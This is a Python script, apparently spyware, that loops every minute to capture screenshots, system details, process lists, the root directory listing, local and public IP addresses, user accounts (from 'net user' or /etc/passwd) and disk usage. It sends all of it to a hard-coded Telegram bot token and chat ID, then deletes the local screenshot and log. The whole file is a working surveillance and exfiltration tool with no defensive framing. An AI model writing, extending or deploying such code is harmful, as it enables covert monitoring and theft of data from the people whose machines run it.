import asyncio
import os
import platform
import psutil
import socket
import sys
import pyautogui
import shutil
import zipfile
from datetime import datetime
from telegram import Bot
from urllib.request import urlopen
from bs4 import BeautifulSoup
import time
import subprocess
import signal
import json
from pathlib import Path
from selenium import webdriver



bot_token = '5837198097:AAHSVjpeldgYMviEAV5FpQehziAx5ANl6UM'
your_telegram_id = '2120150153'
interval = 60

bot = Bot(token=bot_token)

async def send_screenshot():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    screenshot_file = 'screenshot.png'
    pyautogui.screenshot(screenshot_file)

    message = f'Screenshot from {hostname} ({ip_address})\n'
    with open(screenshot_file, 'rb') as f:
        await bot.send_message(chat_id=your_telegram_id, text=message)
        await bot.send_photo(chat_id=your_telegram_id, photo=f)

    os.remove(screenshot_file)

async def get_system_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    uname = platform.uname()
    system = uname.system
    node_name = uname.node
    release = uname.release
    version = uname.version
    machine = uname.machine
    processor = uname.processor
    
    system_info = f"System Information:\n\nHost name: {hostname}\nIP address: {ip_address}\nOperating system: {system}\nNode name: {node_name}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcessor: {processor}\n"

    await send_message_and_log(system_info)


async def get_process_list():
    message = 'Process list:\n'
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            process_info = proc.as_dict(attrs=['pid', 'name'])
            message += f"PID: {process_info['pid']}, Name: {process_info['name']}\n"
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    await log_info(message)

async def get_files_in_directory(path):
    files = os.listdir(path)
    message = f"Files in directory {path}:\n"
    for file in files:
        message += f"{file}\n"
    await log_info(message)

async def get_process_resources():
    message = 'Process resources:\n'
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            process_info = proc.as_dict(attrs=['pid', 'name', 'memory_info', 'cpu_percent'])
            message += f"PID: {process_info['pid']}, Name: {process_info['name']}, Memory: {process_info['memory_info'].rss / 1024 / 1024} MB, CPU: {process_info['cpu_percent']}%\n"
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    await log_info(message)

async def get_disk_usage():
    message = 'Disk usage:\n'
    total, used, free = shutil.disk_usage('/')
    message += f"Total: {total / 1024 / 1024 / 1024} GB, Used: {used / 1024 / 1024 / 1024} GB, Free: {free / 1024 / 1024 / 1024} GB\n"
    await log_info(message)


async def send_message_and_log(message):
    await bot.send_message(chat_id=your_telegram_id, text=message)
    await log_info(message)

async def log_info(info):
    with open('system_info.log', 'a') as f:
        f.write(f'{datetime.now()}: {info}\n')

async def send_log_file():
    if not os.path.exists('system_info.log'):
        print('Error: file system_info.log does not exist')
        return
    
    with open('system_info.log', 'rb') as f:
        await bot.send_document(chat_id=your_telegram_id, document=f)
    
    os.remove('system_info.log')
    print('Sent log file successfully')

async def get_network_info():
    message = 'Network information:\n'
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        message += f"Hostname: {hostname}\n"
        message += f"IP Address: {ip_address}\n"

        # Get public IP address
        with urlopen('https://api.ipify.org') as response:
            public_ip_address = response.read().decode()
            message += f"Public IP Address: {public_ip_address}\n"
    except Exception as e:
        message += f"Error getting network information: {e}\n"
    await log_info(message)


async def get_system_users():
    message = 'System users:\n'
    if platform.system() == 'Windows':
        try:
            users = subprocess.check_output(['net', 'user']).decode().split('\n')
            for user in users:
                if user.strip().startswith('User accounts'):
                    continue
                if user.strip().startswith('The command completed successfully'):
                    continue
                username = user.split()[0]
                message += f"{username}\n"
        except Exception as e:
            message += f"Error getting system users: {e}\n"
    elif platform.system() == 'Linux':
        try:
            users = subprocess.check_output(['cut', '-d:', '-f1', '/etc/passwd']).decode().split('\n')
            for user in users:
                if user.strip() == '':
                    continue
                message += f"{user.strip()}\n"
        except Exception as e:
            message += f"Error getting system users: {e}\n"
    else:
        message += "Unsupported platform\n"
    await log_info(message)


async def main():
    while True:
        try:

            await send_screenshot()
            await get_system_info()
            await get_process_list()
            await get_files_in_directory('/')
            await get_network_info()
            await get_process_resources()
            await get_system_users()
            await get_disk_usage()
            await send_message_and_log('Sending log file...')
            await send_log_file()
        except Exception as e:
            await log_info(f'Error: {e}')

        await asyncio.sleep(interval)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except Exception as e:
        print(f'Error: {e}')
        time.sleep(10)
